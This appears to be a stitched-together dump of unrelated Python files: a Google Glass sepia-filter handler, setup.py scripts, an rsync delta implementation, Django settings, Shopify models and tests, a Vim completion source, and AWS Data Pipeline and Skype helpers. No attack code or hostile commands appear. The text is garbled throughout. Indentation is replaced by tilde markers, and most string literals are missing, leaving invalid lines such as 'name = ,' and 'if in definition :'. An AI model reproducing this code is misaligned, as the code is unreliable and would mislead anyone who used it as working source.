__all__ = [ "handle_item" , "CONTACTS" , "WELCOMES" ] \n 
\n 
"""Contacts that need to registered when the user connects to this service""" \n 
CONTACTS = [ \n 
{ \n 
"acceptTypes" : "image/*" , \n 
"id" : "instaglass_sepia" , \n 
"displayName" : "Sepia" , \n 
"imageUrls" : [ base_url + "/images/sepia.jpg" ] \n 
} \n 
] \n 
\n 
"""Welcome message cards that are sent when the user first connects to this service""" \n 
WELCOMES = [ \n 
{ \n 
"html" : ( "<article class=\\"photo\\">" \n 
"  <img src=\\"" + base_url + "/images/sepia.jpg\\" width=\\"100%\\" height=\\"100%\\">" \n 
"  <div class=\\"photo-overlay\\"></div>" \n 
"  <section>" \n 
"    <p class=\\"text-auto-size\\">Welcome to Instaglass!</p>" \n 
"  </section>" \n 
"</article>" ) \n 
} \n 
] \n 
\n 
\n 
def _make_linear_ramp ( white ) : \n 
~~~ """ generate a palette in a format acceptable for `putpalette`, which\n        expects [r,g,b,r,g,b,...]\n    """ \n 
ramp = [ ] \n 
r , g , b = white \n 
for i in range ( 255 ) : \n 
~~~ ramp . extend ( ( r * i / 255 , g * i / 255 , b * i / 255 ) ) \n 
~~ return ramp \n 
\n 
\n 
~~ def _apply_sepia_filter ( image ) : \n 
~~~ """ Apply a sepia-tone filter to the given PIL Image\n        Based on code at: http://effbot.org/zone/pil-sepia.htm\n    """ \n 
# make sepia ramp (tweak color as necessary) \n 
sepia = _make_linear_ramp ( ( 255 , 240 , 192 ) ) \n 
\n 
# convert to grayscale \n 
orig_mode = image . mode \n 
if orig_mode != "L" : \n 
~~~ image = image . convert ( "L" ) \n 
\n 
# apply contrast enhancement here, e.g. \n 
~~ image = ImageOps . autocontrast ( image ) \n 
\n 
# apply sepia palette \n 
image . putpalette ( sepia ) \n 
\n 
# convert back to its original mode \n 
if orig_mode != "L" : \n 
~~~ image = image . convert ( orig_mode ) \n 
\n 
~~ return image \n 
\n 
\n 
~~ def handle_item ( item , notification , service , test ) : \n 
~~~ """Callback for Timeline updates.""" \n 
\n 
if "userActions" in notification : \n 
~~~ for action in notification [ "userActions" ] : \n 
~~~ if "type" in action and action [ "type" ] == "SHARE" : \n 
~~~ break \n 
~~ ~~ else : \n 
# No SHARE action \n 
~~~ return \n 
~~ ~~ else : \n 
# No SHARE action \n 
~~~ return \n 
\n 
~~ if "recipients" in item : \n 
~~~ for rec in item [ "recipients" ] : \n 
~~~ if rec [ "id" ] == "instaglass_sepia" : \n 
~~~ break \n 
~~ ~~ else : \n 
# Item not meant for this service \n 
~~~ return \n 
~~ ~~ else : \n 
# Item not meant for this service \n 
~~~ return \n 
\n 
~~ imageId = None \n 
if "attachments" in item : \n 
~~~ for att in item [ "attachments" ] : \n 
~~~ if att [ "contentType" ] . startswith ( "image/" ) : \n 
~~~ imageId = att [ "id" ] \n 
break \n 
\n 
~~ ~~ ~~ if imageId is None : \n 
~~~ logging . info ( "No suitable attachment" ) \n 
return \n 
\n 
~~ attachment_metadata = service . timeline ( ) . attachments ( ) . get ( \n 
itemId = item [ "id" ] , attachmentId = imageId ) . execute ( ) \n 
content_url = attachment_metadata . get ( "contentUrl" ) \n 
resp , content = service . _http . request ( content_url ) \n 
\n 
if resp . status != 200 : \n 
~~~ logging . info ( "Couldn\'t fetch attachment" ) \n 
\n 
~~ tempimg = cStringIO . StringIO ( content ) \n 
im = Image . open ( tempimg ) \n 
new_im = _apply_sepia_filter ( im ) \n 
\n 
f = cStringIO . StringIO ( ) \n 
new_im . save ( f , "JPEG" ) \n 
content = f . getvalue ( ) \n 
f . close ( ) \n 
\n 
new_item = { } \n 
new_item [ "menuItems" ] = [ { "action" : "SHARE" } ] \n 
\n 
result = upload . multipart_insert ( new_item , content , "image/jpeg" , service , test ) \n 
logging . info ( result ) \n 
~~ import sys \n 
from setuptools import setup \n 
\n 
install_requires = [ \n 
"argparse>=1.2.1" , \n 
"requests>=2.4.3" \n 
] \n 
\n 
setup ( \n 
name = , \n 
version = , \n 
description = , \n 
author = , \n 
author_email = , \n 
url = , \n 
license = , \n 
packages = ( , ) , \n 
scripts = ( \n 
, \n 
) , \n 
install_requires = install_requires , \n 
) \n 
# coding=utf-8 \n 
__author__ = \n 
\n 
Handler_mapping = { } \n 
\n 
\n 
def handler ( cmdid ) : \n 
~~~ \n 
\n 
def _module_dec ( cls ) : \n 
~~~ Handler_mapping [ cmdid ] = cls \n 
return cls \n 
\n 
~~ return _module_dec #!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
~~ """\nThis is a pure Python implementation of the [rsync algorithm] [TM96].\n\nUpdated to use SHA256 hashing (instead of the standard implementation\nwhich uses outdated MD5 hashes), and packages for disutils\ndistribution by Isis Lovecruft, <isis@patternsinthevoid.net>. The\nmajority of the code is blatantly stolen from Eric Pruitt\'s code\nas posted on [ActiveState] [1].\n\n[1]: https://code.activestate.com/recipes/577518-rsync-algorithm/\n\n[TM96]: Andrew Tridgell and Paul Mackerras. The rsync algorithm.\nTechnical Report TR-CS-96-05, Canberra 0200 ACT, Australia, 1996.\nhttp://samba.anu.edu.au/rsync/.\n\n### Example Use Case: ###\n\n    # On the system containing the file that needs to be patched\n    >>> unpatched = open("unpatched.file", "rb")\n    >>> hashes = blockchecksums(unpatched)\n\n    # On the remote system after having received `hashes`\n    >>> patchedfile = open("patched.file", "rb")\n    >>> delta = rsyncdelta(patchedfile, hashes)\n\n    # System with the unpatched file after receiving `delta`\n    >>> unpatched.seek(0)\n    >>> save_to = open("locally-patched.file", "wb")\n    >>> patchstream(unpatched, save_to, delta)\n""" \n 
\n 
import collections \n 
import hashlib \n 
\n 
if not ( hasattr ( __builtins__ , "bytes" ) ) or str is bytes : \n 
# Python 2.x compatibility \n 
~~~ def bytes ( var , * args ) : \n 
~~~ try : \n 
~~~ return . join ( map ( chr , var ) ) \n 
~~ except TypeError : \n 
~~~ return map ( ord , var ) \n 
\n 
~~ ~~ ~~ __all__ = [ "rollingchecksum" , "weakchecksum" , "patchstream" , "rsyncdelta" , \n 
"blockchecksums" ] \n 
\n 
\n 
def rsyncdelta ( datastream , remotesignatures , blocksize = 4096 ) : \n 
~~~ """\n    Generates a binary patch when supplied with the weak and strong\n    hashes from an unpatched target and a readable stream for the\n    up-to-date data. The blocksize must be the same as the value\n    used to generate remotesignatures.\n    """ \n 
remote_weak , remote_strong = remotesignatures \n 
\n 
match = True \n 
matchblock = - 1 \n 
deltaqueue = collections . deque ( ) \n 
\n 
while True : \n 
~~~ if match and datastream is not None : \n 
# Whenever there is a match or the loop is running for the first \n 
# time, populate the window using weakchecksum instead of rolling \n 
# through every single byte which takes at least twice as long. \n 
~~~ window = collections . deque ( bytes ( datastream . read ( blocksize ) ) ) \n 
checksum , a , b = weakchecksum ( window ) \n 
\n 
~~ try : \n 
# If there are two identical weak checksums in a file, and the \n 
# matching strong hash does not occur at the first match, it will \n 
# be missed and the data sent over. May fix eventually, but this \n 
# problem arises very rarely. \n 
~~~ matchblock = remote_weak . index ( checksum , matchblock + 1 ) \n 
stronghash = hashlib . sha256 ( bytes ( window ) ) . hexdigest ( ) \n 
matchblock = remote_strong . index ( stronghash , matchblock ) \n 
\n 
match = True \n 
deltaqueue . append ( matchblock ) \n 
\n 
if datastream . closed : \n 
~~~ break \n 
~~ continue \n 
\n 
~~ except ValueError : \n 
# The weakchecksum did not match \n 
~~~ match = False \n 
try : \n 
~~~ if datastream : \n 
# Get the next byte and affix to the window \n 
~~~ newbyte = ord ( datastream . read ( 1 ) ) \n 
window . append ( newbyte ) \n 
~~ ~~ except TypeError : \n 
# No more data from the file; the window will slowly shrink. \n 
# newbyte needs to be zero from here on to keep the checksum \n 
# correct. \n 
~~~ newbyte = 0 \n 
tailsize = datastream . tell ( ) % blocksize \n 
datastream = None \n 
\n 
~~ if datastream is None and len ( window ) <= tailsize : \n 
# The likelihood that any blocks will match after this is \n 
# nearly nil so call it quits. \n 
~~~ deltaqueue . append ( window ) \n 
break \n 
\n 
# Yank off the extra byte and calculate the new window checksum \n 
~~ oldbyte = window . popleft ( ) \n 
checksum , a , b = rollingchecksum ( oldbyte , newbyte , a , b , blocksize ) \n 
\n 
# Add the old byte the file delta. This is data that was not found \n 
# inside of a matching block so it needs to be sent to the target. \n 
try : \n 
~~~ deltaqueue [ - 1 ] . append ( oldbyte ) \n 
~~ except ( AttributeError , IndexError ) : \n 
~~~ deltaqueue . append ( [ oldbyte ] ) \n 
\n 
# Return a delta that starts with the blocksize and converts all iterables \n 
# to bytes. \n 
~~ ~~ ~~ deltastructure = [ blocksize ] \n 
for element in deltaqueue : \n 
~~~ if isinstance ( element , int ) : \n 
~~~ deltastructure . append ( element ) \n 
~~ elif element : \n 
~~~ deltastructure . append ( bytes ( element ) ) \n 
\n 
~~ ~~ return deltastructure \n 
\n 
\n 
~~ def blockchecksums ( instream , blocksize = 4096 ) : \n 
~~~ """\n    Returns a list of weak and strong hashes for each block of the\n    defined size for the given data stream.\n    """ \n 
weakhashes = list ( ) \n 
stronghashes = list ( ) \n 
read = instream . read ( blocksize ) \n 
\n 
while read : \n 
~~~ weakhashes . append ( weakchecksum ( bytes ( read ) ) [ 0 ] ) \n 
stronghashes . append ( hashlib . sha256 ( read ) . hexdigest ( ) ) \n 
read = instream . read ( blocksize ) \n 
\n 
~~ return weakhashes , stronghashes \n 
\n 
\n 
~~ def patchstream ( instream , outstream , delta ) : \n 
~~~ """\n    Patches instream using the supplied delta and write the resultantant\n    data to outstream.\n    """ \n 
blocksize = delta [ 0 ] \n 
\n 
for element in delta [ 1 : ] : \n 
~~~ if isinstance ( element , int ) and blocksize : \n 
~~~ instream . seek ( element * blocksize ) \n 
element = instream . read ( blocksize ) \n 
~~ outstream . write ( element ) \n 
\n 
\n 
~~ ~~ def rollingchecksum ( removed , new , a , b , blocksize = 4096 ) : \n 
~~~ """\n    Generates a new weak checksum when supplied with the internal state\n    of the checksum calculation for the previous window, the removed\n    byte, and the added byte.\n    """ \n 
a -= removed - new \n 
b -= removed * blocksize - a \n 
return ( b << 16 ) | a , a , b \n 
\n 
\n 
~~ def weakchecksum ( data ) : \n 
~~~ """\n    Generates a weak checksum from an iterable set of bytes.\n    """ \n 
a = b = 0 \n 
l = len ( data ) \n 
for i in range ( l ) : \n 
~~~ a += data [ i ] \n 
b += ( l - i ) * data [ i ] \n 
\n 
~~ return ( b << 16 ) | a , a , b \n 
~~ import os \n 
from shopify_settings import * \n 
\n 
SITE_ROOT = os . path . dirname ( os . path . realpath ( __file__ ) ) \n 
\n 
try : \n 
~~~ from djangoappengine . settings_base import * \n 
USING_APP_ENGINE = True \n 
~~ except ImportError : \n 
~~~ USING_APP_ENGINE = False \n 
\n 
DEBUG = True \n 
TEMPLATE_DEBUG = DEBUG \n 
\n 
DATABASES = { \n 
: { \n 
: , \n 
: os . path . join ( SITE_ROOT , ) , \n 
: , # Not used with sqlite3. \n 
: , # Not used with sqlite3. \n 
: , # Set to empty string for localhost. Not used with  \n 
: , # Set to empty string for default. Not used with sq \n 
} \n 
} \n 
\n 
SITE_ID = 1 \n 
\n 
# If you set this to False, Django will make some optimizations so as not \n 
# to load the internationalization machinery. \n 
~~ USE_I18N = True \n 
\n 
# If you set this to False, Django will not format dates, numbers and \n 
# calendars according to the current locale \n 
USE_L10N = True \n 
\n 
# Absolute filesystem path to the directory that will hold user-uploaded files. \n 
# Example: "/home/media/media.lawrence.com/media/" \n 
MEDIA_ROOT = \n 
\n 
# URL that handles the media served from MEDIA_ROOT. Make sure to use a \n 
# trailing slash. \n 
# Examples: "http://media.lawrence.com/media/", "http://example.com/media/" \n 
MEDIA_URL = \n 
\n 
# Absolute path to the directory static files should be collected to. \n 
\n 
# in apps\' "static/" subdirectories and in STATICFILES_DIRS. \n 
# Example: "/home/media/media.lawrence.com/static/" \n 
STATIC_ROOT = \n 
\n 
# URL prefix for static files. \n 
# Example: "http://media.lawrence.com/static/" \n 
STATIC_URL = \n 
\n 
# URL prefix for admin static files -- CSS, JavaScript and images. \n 
# Make sure to use a trailing slash. \n 
# Examples: "http://foo.com/static/admin/", "/static/admin/". \n 
ADMIN_MEDIA_PREFIX = \n 
\n 
# Additional locations of static files \n 
STATICFILES_DIRS = ( \n 
os . path . join ( SITE_ROOT , ) , \n 
) \n 
\n 
\n 
SECRET_KEY = \n 
\n 
# List of callables that know how to import templates from various sources. \n 
TEMPLATE_LOADERS = ( \n 
, \n 
, \n 
) \n 
\n 
TEMPLATE_CONTEXT_PROCESSORS = ( \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
) \n 
if not USING_APP_ENGINE : \n 
~~~ TEMPLATE_CONTEXT_PROCESSORS += ( \n 
, \n 
) \n 
\n 
~~ MIDDLEWARE_CLASSES = ( \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
) \n 
\n 
ROOT_URLCONF = \n 
\n 
TEMPLATE_DIRS = ( \n 
os . path . join ( SITE_ROOT , ) , \n 
) \n 
\n 
INSTALLED_APPS = ( \n 
, \n 
, \n 
, \n 
, \n 
, \n 
, \n 
) \n 
if USING_APP_ENGINE : \n 
~~~ INSTALLED_APPS += ( \n 
, \n 
, \n 
) \n 
~~ else : \n 
~~~ INSTALLED_APPS += ( \n 
, \n 
, \n 
) \n 
\n 
# A sample logging configuration. The only tangible logging \n 
# performed by this configuration is to send an email to \n 
# the site admins on every HTTP 500 error. \n 
# See http://docs.djangoproject.com/en/dev/topics/logging for \n 
# more details on how to customize your logging configuration. \n 
~~ LOGGING = { \n 
: 1 , \n 
: False , \n 
: { \n 
: { \n 
: , \n 
: \n 
} \n 
} , \n 
: { \n 
: { \n 
: [ ] , \n 
: , \n 
: True , \n 
} , \n 
} \n 
} \n 
from . customer_saved_search import CustomerSavedSearch \n 
\n 
\n 
class CustomerGroup ( CustomerSavedSearch ) : \n 
~~~ pass \n 
~~ from . . base import ShopifyResource \n 
\n 
\n 
class ShippingZone ( ShopifyResource ) : \n 
~~~ pass \n 
~~ import shopify \n 
from test . test_helper import TestCase \n 
from pyactiveresource . activeresource import ActiveResource \n 
from pyactiveresource . util import xml_to_dict \n 
\n 
class OrderTest ( TestCase ) : \n 
\n 
~~~ def test_should_be_loaded_correctly_from_order_xml ( self ) : \n 
~~~ order_xml = """<?xml version="1.0" encoding="UTF-8"?>\n          <order>\n            <note-attributes type="array">\n              <note-attribute>\n                <name>size</name>\n                <value>large</value>\n              </note-attribute>\n            </note-attributes>\n          </order>""" \n 
order = shopify . Order ( xml_to_dict ( order_xml ) [ "order" ] ) \n 
\n 
self . assertEqual ( 1 , len ( order . note_attributes ) ) \n 
\n 
note_attribute = order . note_attributes [ 0 ] \n 
self . assertEqual ( "size" , note_attribute . name ) \n 
self . assertEqual ( "large" , note_attribute . value ) \n 
\n 
~~ def test_should_be_able_to_add_note_attributes_to_an_order ( self ) : \n 
~~~ order = shopify . Order ( ) \n 
order . note_attributes = [ ] \n 
order . note_attributes . append ( shopify . NoteAttribute ( { : "color" , : "blue" } ) ) \n 
\n 
order_xml = xml_to_dict ( order . to_xml ( ) ) \n 
note_attributes = order_xml [ "order" ] [ "note_attributes" ] \n 
self . assertTrue ( isinstance ( note_attributes , list ) ) \n 
\n 
attribute = note_attributes [ 0 ] \n 
self . assertEqual ( "color" , attribute [ "name" ] ) \n 
self . assertEqual ( "blue" , attribute [ "value" ] ) \n 
\n 
~~ def test_get_order ( self ) : \n 
~~~ self . fake ( , method = , body = self . load_fixture ( ) ) \n 
order = shopify . Order . find ( 450789469 ) \n 
self . assertEqual ( , order . email ) \n 
\n 
~~ def test_get_order_transaction ( self ) : \n 
~~~ self . fake ( , method = , body = self . load_fixture ( ) ) \n 
order = shopify . Order . find ( 450789469 ) \n 
self . fake ( , method = , body = self . load_fixture ( transactions = order . transactions ( ) \n 
self . assertEqual ( "409.94" , transactions [ 0 ] . amount ) \n 
# ============================================================================ \n 
# FILE: file.py \n 
# AUTHOR: Felipe Morales <hel.sheep at gmail.com> \n 
#         Shougo Matsushita <Shougo.Matsu at gmail.com> \n 
# License: MIT license \n 
# ============================================================================ \n 
\n 
~~ ~~ import os \n 
import re \n 
from os . path import exists , dirname \n 
from . base import Base \n 
from deoplete . util import set_default , get_simple_buffer_config \n 
\n 
\n 
class Source ( Base ) : \n 
\n 
~~~ def __init__ ( self , vim ) : \n 
~~~ Base . __init__ ( self , vim ) \n 
\n 
self . name = \n 
self . mark = \n 
self . min_pattern_length = 0 \n 
self . rank = 150 \n 
\n 
set_default ( self . vim , , 0 ) \n 
\n 
~~ def get_complete_position ( self , context ) : \n 
~~~ pos = context [ ] . rfind ( ) \n 
return pos if pos < 0 else pos + 1 \n 
\n 
~~ def gather_candidates ( self , context ) : \n 
~~~ p = self . __longest_path_that_exists ( context [ ] ) \n 
if p in ( None , [ ] ) or p == or re . search ( , p ) : \n 
~~~ return [ ] \n 
~~ complete_str = self . __substitute_path ( dirname ( p ) + ) \n 
if not os . path . isdir ( complete_str ) : \n 
~~~ return [ ] \n 
~~ hidden = context [ ] . find ( ) == 0 \n 
dirs = [ x for x in os . listdir ( complete_str ) \n 
if os . path . isdir ( complete_str + x ) and \n 
( hidden or x [ 0 ] != ) ] \n 
files = [ x for x in os . listdir ( complete_str ) \n 
if not os . path . isdir ( complete_str + x ) and \n 
( hidden or x [ 0 ] != ) ] \n 
return [ { : x , : x + } for x in sorted ( dirs ) \n 
] + [ { : x } for x in sorted ( files ) ] \n 
\n 
~~ def __longest_path_that_exists ( self , input_str ) : \n 
~~~ data = re . split ( self . vim . call ( \n 
, \n 
self . vim . options [ ] ) , input_str ) \n 
pos = [ " " . join ( data [ i : ] ) for i in range ( len ( data ) ) ] \n 
existing_paths = list ( filter ( lambda x : exists ( \n 
dirname ( self . __substitute_path ( x ) ) ) , pos ) ) \n 
if existing_paths and len ( existing_paths ) > 0 : \n 
~~~ return sorted ( existing_paths ) [ - 1 ] \n 
~~ return None \n 
\n 
~~ def __substitute_path ( self , path ) : \n 
~~~ buffer_path = get_simple_buffer_config ( \n 
self . vim , \n 
, \n 
) \n 
m = re . match ( , path ) \n 
if m : \n 
~~~ h = self . vim . funcs . repeat ( , len ( m . group ( 1 ) ) ) \n 
return re . sub ( , \n 
self . vim . funcs . fnamemodify ( \n 
( self . vim . funcs . bufname ( ) \n 
if buffer_path \n 
else self . vim . funcs . getcwd ( ) ) , + h ) , \n 
path ) \n 
~~ m = re . match ( , path ) \n 
if m and os . environ . get ( ) : \n 
~~~ return re . sub ( , os . environ . get ( ) , path ) \n 
~~ m = re . match ( , path ) \n 
if m and os . environ . get ( m . group ( 1 ) ) : \n 
~~~ return re . sub ( , os . environ . get ( m . group ( 1 ) ) , path ) \n 
~~ return path \n 
~~ ~~ """\n======================\nflask_flatpages.compat\n======================\n\nCompatibility module for supporting both Python 2 and Python 3.\n\n""" \n 
\n 
import sys \n 
\n 
\n 
IS_PY3 = sys . version_info [ 0 ] == 3 \n 
string_types = ( str , ) if IS_PY3 else ( basestring , ) # noqa \n 
text_type = str if IS_PY3 else unicode # noqa \n 
\n 
\n 
def itervalues ( obj , ** kwargs ) : \n 
~~~ """Iterate over dict values.""" \n 
return iter ( obj . values ( ** kwargs ) ) if IS_PY3 else obj . itervalues ( ** kwargs ) \n 
# coding: utf8 \n 
~~ """\n    Test suite for tinycss\n    ----------------------\n\n    :copyright: (c) 2012 by Simon Sapin.\n    :license: BSD, see LICENSE for more details.\n""" \n 
\n 
\n 
from __future__ import unicode_literals \n 
\n 
\n 
def assert_errors ( errors , expected_errors ) : \n 
~~~ """Test not complete error messages but only substrings.""" \n 
assert len ( errors ) == len ( expected_errors ) \n 
for error , expected in zip ( errors , expected_errors ) : \n 
~~~ assert expected in str ( error ) \n 
# -*- coding: utf-8 -*- \n 
# The MIT License (MIT) \n 
# \n 
# Copyright (c) 2014-2016 Thorsten Simons (sw@snomis.de) \n 
# \n 
# Permission is hereby granted, free of charge, to any person obtaining a copy of \n 
# this software and associated documentation files (the "Software"), to deal in \n 
# the Software without restriction, including without limitation the rights to \n 
# use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of \n 
# the Software, and to permit persons to whom the Software is furnished to do so, \n 
# subject to the following conditions: \n 
# \n 
# The above copyright notice and this permission notice shall be included in all \n 
# copies or substantial portions of the Software. \n 
# \n 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR \n 
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS \n 
# FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR \n 
# COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER \n 
# IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN \n 
# CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE. \n 
\n 
~~ ~~ from setuptools import setup , find_packages # Always prefer setuptools over distutils \n 
from codecs import open # To use a consistent encoding \n 
from os import path \n 
from hcpsdk . version import _Version \n 
#try: \n 
#except ImportError as e: \n 
\n 
\n 
here = path . abspath ( path . dirname ( __file__ ) ) \n 
\n 
# Get the long description from the relevant file \n 
with open ( path . normpath ( path . join ( here , ) ) , encoding = ) as f : \n 
~~~ long_description = f . read ( ) \n 
\n 
~~ setup ( \n 
name = , \n 
# Versions should comply with PEP440. For a discussion on single-sourcing \n 
# the version across setup.py and the project code, see \n 
# http://packaging.python.org/en/latest/tutorial.html#version \n 
\n 
version = str ( _Version ( ) ) , \n 
description = , \n 
long_description = long_description , \n 
\n 
\n 
url = , \n 
\n 
# Author details \n 
author = , \n 
author_email = , \n 
\n 
# Choose your license \n 
license = , \n 
\n 
# See https://pypi.python.org/pypi?%3Aaction=list_classifiers \n 
classifiers = [ \n 
# How mature is this project? Common values are \n 
# 3 - Alpha \n 
# 4 - Beta \n 
# 5 - Production/Stable \n 
, \n 
\n 
# Indicate who your project is intended for \n 
, \n 
, \n 
, \n 
\n 
# Pick your license as you wish (should match "license" above) \n 
, \n 
\n 
# Specify the Python versions you support here. In particular, ensure \n 
# that you indicate whether you support Python 2, Python 3 or both. \n 
, \n 
\n 
# more... \n 
, \n 
, \n 
] , \n 
\n 
# What does your project relate to? \n 
keywords = , \n 
\n 
# You can just specify the packages manually here if your project is \n 
# simple. Or you can use find_packages(). \n 
packages = find_packages ( exclude = [ ] ) , \n 
\n 
# List run-time dependencies here. These will be installed by pip when your \n 
# project is installed. For an analysis of "install_requires" vs pip\'s \n 
# requirements files see: \n 
# https://packaging.python.org/en/latest/technical.html#install-requires-vs-requirements-files \n 
install_requires = [ ] , \n 
\n 
# List additional groups of dependencies here (e.g. development dependencies). \n 
# You can install these using the following syntax, for example: \n 
# $ pip install -e .[dev,test] \n 
# extras_require = { \n 
\n 
\n 
#                  }, \n 
\n 
# If there are data files included in your packages that need to be \n 
# installed, specify them here. If using Python 2.6 or less, then these \n 
# have to be included in MANIFEST.in as well. \n 
# package_data={ \n 
\n 
#               }, \n 
\n 
\n 
# need to place data files outside of your packages. \n 
# see http://docs.python.org/3.4/distutils/setupscript.html#installing-additional-files \n 
\n 
\n 
\n 
# To provide executable scripts, use entry points in preference to the \n 
# "scripts" keyword. Entry points provide cross-platform support and allow \n 
# pip to create the appropriate form of executable for the Target platform. \n 
# entry_points={ \n 
\n 
#               }, \n 
) \n 
# Copyright 2014 Amazon.com, Inc. or its affiliates. All Rights Reserved. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"). You \n 
# may not use this file except in compliance with the License. A copy of \n 
# the License is located at \n 
# \n 
#     http://aws.amazon.com/apache2.0/ \n 
# \n 
# or in the "license" file accompanying this file. This file is \n 
# distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF \n 
# ANY KIND, either express or implied. See the License for the specific \n 
# language governing permissions and limitations under the License. \n 
import json \n 
\n 
\n 
class PipelineDefinitionError ( Exception ) : \n 
~~~ def __init__ ( self , msg , definition ) : \n 
~~~ full_msg = ( \n 
"Error in pipeline definition: %s\\n" % msg ) \n 
super ( PipelineDefinitionError , self ) . __init__ ( full_msg ) \n 
self . msg = msg \n 
self . definition = definition \n 
\n 
\n 
~~ ~~ def api_to_definition ( definition ) : \n 
\n 
# we have to be careful *not* to mutate the existing \n 
# response as other code might need to the original \n 
# api_response. \n 
~~~ if in definition : \n 
~~~ definition [ ] = _api_to_objects_definition ( \n 
definition . pop ( ) ) \n 
~~ if in definition : \n 
~~~ definition [ ] = _api_to_parameters_definition ( \n 
definition . pop ( ) ) \n 
~~ if in definition : \n 
~~~ definition [ ] = _api_to_values_definition ( \n 
definition . pop ( ) ) \n 
~~ return definition \n 
\n 
\n 
~~ def definition_to_api_objects ( definition ) : \n 
~~~ if not in definition : \n 
~~~ raise PipelineDefinitionError ( \'Missing "objects" key\' , definition ) \n 
~~ api_elements = [ ] \n 
# To convert to the structure expected by the service, \n 
# we convert the existing structure to a list of dictionaries. \n 
\n 
for element in definition [ ] : \n 
~~~ try : \n 
~~~ element_id = element . pop ( ) \n 
~~ except KeyError : \n 
~~~ raise PipelineDefinitionError ( \'Missing "id" key of element: %s\' % \n 
json . dumps ( element ) , definition ) \n 
~~ api_object = { : element_id } \n 
# If a name is provided, then we use that for the name, \n 
# otherwise the id is used for the name. \n 
name = element . pop ( , element_id ) \n 
api_object [ ] = name \n 
# Now we need the field list.  Each element in the field list is a dict \n 
\n 
fields = [ ] \n 
for key , value in sorted ( element . items ( ) ) : \n 
~~~ fields . extend ( _parse_each_field ( key , value ) ) \n 
~~ api_object [ ] = fields \n 
api_elements . append ( api_object ) \n 
~~ return api_elements \n 
\n 
\n 
~~ def definition_to_api_parameters ( definition ) : \n 
~~~ if not in definition : \n 
~~~ return None \n 
~~ parameter_objects = [ ] \n 
for element in definition [ ] : \n 
~~~ try : \n 
~~~ parameter_id = element . pop ( ) \n 
~~ except KeyError : \n 
~~~ raise PipelineDefinitionError ( \'Missing "id" key of parameter: %s\' % \n 
json . dumps ( element ) , definition ) \n 
~~ parameter_object = { : parameter_id } \n 
# Now we need the attribute list.  Each element in the attribute list \n 
\n 
attributes = [ ] \n 
for key , value in sorted ( element . items ( ) ) : \n 
~~~ attributes . extend ( _parse_each_field ( key , value ) ) \n 
~~ parameter_object [ ] = attributes \n 
parameter_objects . append ( parameter_object ) \n 
~~ return parameter_objects \n 
\n 
\n 
~~ def definition_to_parameter_values ( definition ) : \n 
~~~ if not in definition : \n 
~~~ return None \n 
~~ parameter_values = [ ] \n 
for key in definition [ ] : \n 
~~~ parameter_values . extend ( \n 
_convert_single_parameter_value ( key , definition [ ] [ key ] ) ) \n 
\n 
~~ return parameter_values \n 
\n 
\n 
~~ def _parse_each_field ( key , value ) : \n 
~~~ values = [ ] \n 
if isinstance ( value , list ) : \n 
~~~ for item in value : \n 
~~~ values . append ( _convert_single_field ( key , item ) ) \n 
~~ ~~ else : \n 
~~~ values . append ( _convert_single_field ( key , value ) ) \n 
~~ return values \n 
\n 
\n 
~~ def _convert_single_field ( key , value ) : \n 
~~~ field = { : key } \n 
if isinstance ( value , dict ) and list ( value . keys ( ) ) == [ ] : \n 
~~~ field [ ] = value [ ] \n 
~~ else : \n 
~~~ field [ ] = value \n 
~~ return field \n 
\n 
\n 
~~ def _convert_single_parameter_value ( key , values ) : \n 
~~~ parameter_values = [ ] \n 
if isinstance ( values , list ) : \n 
~~~ for each_value in values : \n 
~~~ parameter_value = { : key , : each_value } \n 
parameter_values . append ( parameter_value ) \n 
~~ ~~ else : \n 
~~~ parameter_value = { : key , : values } \n 
parameter_values . append ( parameter_value ) \n 
~~ return parameter_values \n 
\n 
\n 
~~ def _api_to_objects_definition ( api_response ) : \n 
~~~ pipeline_objects = [ ] \n 
for element in api_response : \n 
~~~ current = { \n 
: element [ ] , \n 
: element [ ] \n 
} \n 
for field in element [ ] : \n 
~~~ key = field [ ] \n 
if in field : \n 
~~~ value = field [ ] \n 
~~ else : \n 
~~~ value = { : field [ ] } \n 
~~ _add_value ( key , value , current ) \n 
~~ pipeline_objects . append ( current ) \n 
~~ return pipeline_objects \n 
\n 
\n 
~~ def _api_to_parameters_definition ( api_response ) : \n 
~~~ parameter_objects = [ ] \n 
for element in api_response : \n 
~~~ current = { \n 
: element [ ] \n 
} \n 
for attribute in element [ ] : \n 
~~~ _add_value ( attribute [ ] , attribute [ ] , current ) \n 
~~ parameter_objects . append ( current ) \n 
~~ return parameter_objects \n 
\n 
\n 
~~ def _api_to_values_definition ( api_response ) : \n 
~~~ pipeline_values = { } \n 
for element in api_response : \n 
~~~ _add_value ( element [ ] , element [ ] , pipeline_values ) \n 
~~ return pipeline_values \n 
\n 
\n 
~~ def _add_value ( key , value , current_map ) : \n 
~~~ if key not in current_map : \n 
~~~ current_map [ key ] = value \n 
~~ elif isinstance ( current_map [ key ] , list ) : \n 
# Dupe keys result in values aggregating \n 
# into a list. \n 
~~~ current_map [ key ] . append ( value ) \n 
~~ else : \n 
~~~ converted_list = [ current_map [ key ] , value ] \n 
current_map [ key ] = converted_list \n 
~~ ~~ """Main Skype interface.\n""" \n 
__docformat__ = \n 
\n 
\n 
import threading \n 
import weakref \n 
import logging \n 
\n 
from api import * \n 
from errors import * \n 
from enums import * \n 
from utils import * \n 
from conversion import * \n 
from client import * \n 
from user import * \n 
from call import * \n 
from profile import * \n 
from settings import * \n 
from chat import * \n 
from application import * \n 
from voicemail import * \n 
from sms import * \n 
from filetransfer import * \n 
\n 
\n 
class APINotifier ( SkypeAPINotifier ) : \n 
~~~ def __init__ ( self , skype ) : \n 
~~~ self . skype = weakref . proxy ( skype ) \n 
\n 
